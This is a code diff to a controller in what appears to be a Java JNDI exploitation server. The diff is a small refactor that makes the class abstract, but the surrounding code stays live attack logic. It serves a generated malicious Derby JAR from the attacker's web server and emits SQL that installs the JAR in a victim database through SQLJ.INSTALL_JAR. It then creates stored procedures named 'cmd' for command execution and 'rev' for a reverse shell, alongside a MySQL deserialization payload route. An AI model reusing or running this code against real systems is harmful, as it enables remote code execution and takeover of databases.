@@ -3,7 +3,6 @@ package map.jndi.controller;
 import javassist.ClassPool;
 import javassist.CtClass;
 import map.jndi.Config;
-import map.jndi.annotation.JNDIController;
 import map.jndi.annotation.JNDIMapping;
 import map.jndi.server.WebServer;
 import map.jndi.template.DerbyJarTemplate;
@@ -14,8 +13,7 @@ import java.util.ArrayList;
 import java.util.List;
 import java.util.Properties;
 
-@JNDIController
-public class DatabaseController implements Controller {
+public abstract class DatabaseController implements Controller {
     @JNDIMapping("/MySQL/Deserialize{n}/{host}/{port}/{user}")
     public Properties mysqlDeserialize(String n, String host, String port, String user) throws Exception {
         System.out.println("[MySQL] [Deserialize] Host: " + host + " Port: " + port + " User: " + user);
@@ -193,12 +191,11 @@ public class DatabaseController implements Controller {
         CtClass clazz = pool.get(DerbyJarTemplate.class.getName());
         clazz.replaceClassName(clazz.getName(), className);
 
-        String jarName = className;
-        byte[] jarBytes = JarUtil.create(jarName, clazz.toBytecode());
-        WebServer.getInstance().serveFile("/" + jarName + ".jar", jarBytes);
+        byte[] jarBytes = JarUtil.create(className, clazz.toBytecode());
+        WebServer.getInstance().serveFile("/" + className + ".jar", jarBytes);
 
         List<String> list = new ArrayList<>();
-        list.add("CALL SQLJ.INSTALL_JAR('" + Config.codebase + jarName + ".jar', 'APP." + className + "', 0)");
+        list.add("CALL SQLJ.INSTALL_JAR('" + Config.codebase + className + ".jar', 'APP." + className + "', 0)");
         list.add("CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath', 'APP." + className + "')");
         list.add("CREATE PROCEDURE cmd(IN cmd VARCHAR(255)) PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME '" + className + ".exec'");
         list.add("CREATE PROCEDURE rev(IN host VARCHAR(255), IN port VARCHAR(255)) PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME '" + className + ".rev'");
